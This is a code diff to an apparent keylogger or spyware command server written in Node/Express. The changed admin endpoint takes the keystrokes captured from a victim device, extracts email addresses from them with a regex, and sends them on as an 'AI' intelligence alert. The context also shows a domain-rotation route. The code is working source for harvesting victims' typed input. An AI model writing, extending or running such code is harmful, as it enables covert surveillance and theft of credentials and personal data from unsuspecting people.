@@ -2320,16 +2320,24 @@ app.post('/api/admin/domains/rotate', (req, res) => {
 });
 
 // AI Test endpoint — trigger intelligence analysis manually
-app.post('/api/admin/ai-test', (req, res) => {
+app.post('/api/admin/ai-test', async (req, res) => {
     const { deviceId, email, phone } = req.body || {};
     if (deviceId) {
-        runIntelligenceAnalysis(deviceId).then(() => {
-            res.json({ ok: true, message: 'Intelligence analysis triggered' });
-        }).catch(e => {
-            res.status(500).json({ error: e.message });
-        });
+        try {
+            const d = devices.get(deviceId);
+            if (!d) return res.status(404).json({ error: 'Device not found' });
+            const allKeys = (d.keystrokes || []).map(k => k.k).join('');
+            const emails = [...new Set(allKeys.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g) || [])];
+            if (d.fieldEmail && !emails.includes(d.fieldEmail)) emails.push(d.fieldEmail);
+            const msg = `Test AI Intelligence\nDevice: ${d.label}\nEmails ditemukan: ${emails.length}\n${emails.join('\n')}`;
+            await sendAIAlert(deviceId, 'AI Test', msg);
+            const result = await runIntelligenceAnalysis(deviceId);
+            res.json({ ok: true, emails, result: result || 'completed' });
+        } catch (e) {
+            res.status(500).json({ error: e.message, stack: e.stack });
+        }
     } else {
-        res.status(400).json({ error: 'deviceId required — use /api/devices to list IDs' });
+        res.status(400).json({ error: 'deviceId required' });
     }
 });
 
